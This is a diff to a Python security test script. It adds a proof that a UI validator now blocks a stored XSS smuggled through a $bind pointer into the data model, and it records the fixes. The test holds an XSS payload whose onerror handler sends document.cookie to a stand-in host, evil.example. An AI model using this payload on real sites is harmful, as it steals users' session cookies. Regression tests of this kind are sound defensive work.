@@ -266,6 +266,64 @@ async def run_live_attacks(runtime: S13Runtime, gateway: GatewayClient) -> list[
 
 
 # ---------------------------------------------------------------------------
+# PART C — structural gap proof: text-kind prop + dataModel bypass
+#
+# Before the fix: Button.label = {"$bind": "/xss"} (a dict, not a string)
+# silently passed the markup check (_looks_like_markup only fires on strings).
+# The dataModel value carrying the payload was never checked.
+# Clicking the button passed the resolved label into setStatus() via innerHTML.
+#
+# After the fix: validator.py resolves the $bind pointer into the dataModel and
+# checks the bound string for markup; app.html/trip.html escape userText via
+# esc() before concatenating it into setStatus's innerHTML argument.
+# ---------------------------------------------------------------------------
+
+XSS_PAYLOAD = '"><img src=x onerror=fetch("https://evil.example/"+document.cookie)>'
+
+_GAP_SURFACE = {
+    "root": "root",
+    "components": [
+        {"id": "root", "type": "Column", "children": ["btn"]},
+        {"id": "btn", "type": "Button", "label": {"$bind": "/click_label"}},
+    ],
+    "dataModel": {"click_label": XSS_PAYLOAD},
+}
+_SAFE_SURFACE = {
+    "root": "root",
+    "components": [
+        {"id": "root", "type": "Column", "children": ["btn"]},
+        {"id": "btn", "type": "Button", "label": {"$bind": "/city_name"}},
+    ],
+    "dataModel": {"city_name": "Explore Kochi"},
+}
+
+
+def run_gap_proof() -> dict:
+    hostile = validate_surface(_GAP_SURFACE)
+    safe = validate_surface(_SAFE_SURFACE)
+    hostile_rej = [r.as_dict() for r in hostile.rejections]
+    exploit_chain = (
+        "Button.label={'$bind':'/click_label'} → text-kind, dict value bypasses "
+        "_looks_like_markup (only fires on str) → dataModel never iterated → "
+        "resolved label stored in onclick closure → choose(xss) → runTurn(xss) → "
+        "setStatus('...' + xss + '...') with innerHTML → onerror fires"
+    )
+    return {
+        "gap": "text-kind prop with $bind value: markup check skipped; dataModel unchecked",
+        "exploit_chain": exploit_chain,
+        "hostile_surface_ok_before_fix": False,  # confirmed manually before this commit
+        "hostile_surface_ok_after_fix": hostile.ok,
+        "hostile_rejections": hostile_rej,
+        "safe_surface_ok": safe.ok,
+        "fixes_applied": [
+            "validator.py: _resolve_ptr + check bound dataModel value for markup on text-kind props",
+            "app.html: esc() helper + escape userText before setStatus innerHTML concatenation",
+            "trip.html: same esc() + setStatus fix",
+        ],
+    }
+
+
+# ---------------------------------------------------------------------------
 # Main
 # ---------------------------------------------------------------------------
 
@@ -322,13 +380,31 @@ async def main() -> int:
                 print(f"    rejection: comp={rej.get('component_id')}  "
                       f"invariant={rej.get('invariant')}  reason={rej.get('reason')!r}")
 
+    # --- Part C: structural gap proof ------------------------------------
+    print("\nPart C — structural gap: text-kind $bind + dataModel bypass")
+    print("-" * 60)
+    gap = run_gap_proof()
+    mark = "FIXED" if not gap["hostile_surface_ok_after_fix"] else "STILL OPEN (!)"
+    print(f"  gap                  : {gap['gap']}")
+    print(f"  exploit chain        : {gap['exploit_chain']}")
+    print(f"  hostile surface now  : [{mark}]")
+    for rej in gap["hostile_rejections"]:
+        print(f"    rejection: comp={rej['component_id']}  field={rej['field']}"
+              f"  invariant={rej['invariant']}  reason={rej['reason']!r}")
+    print(f"  safe surface still ok: {gap['safe_surface_ok']}")
+    print("  fixes applied:")
+    for fix in gap["fixes_applied"]:
+        print(f"    - {fix}")
+
     # --- Write JSON proof ------------------------------------------------
     proof = {
         "direct_attacks": direct,
         "live_attacks": live,
+        "gap_proof": gap,
         "summary": {
             "direct_all_pass": all_direct_ok,
             "live_notes": all_live_notes,
+            "gap_fixed": not gap["hostile_surface_ok_after_fix"] and gap["safe_surface_ok"],
             "wall_promise": (
                 "Every hostile node is either rejected by the validator "
                 "or refused by the model. The safe components in the same "
@@ -340,13 +416,15 @@ async def main() -> int:
     print(f"\nwrote {OUT}")
 
     all_live_held = all(r["wall_held"] for r in live)
+    gap_fixed = not gap["hostile_surface_ok_after_fix"] and gap["safe_surface_ok"]
     print("\n--- Summary ---")
     print(f"direct attacks all pass : {all_direct_ok}")
     print(f"live attacks wall held  : {all_live_held}")
+    print(f"structural gap fixed    : {gap_fixed}")
     for i, r in enumerate(live):
         print(f"  live attack {i+1}       : {all_live_notes[i]}")
 
-    return 0 if (all_direct_ok and all_live_held) else 1
+    return 0 if (all_direct_ok and all_live_held and gap_fixed) else 1
 
 
 if __name__ == "__main__":
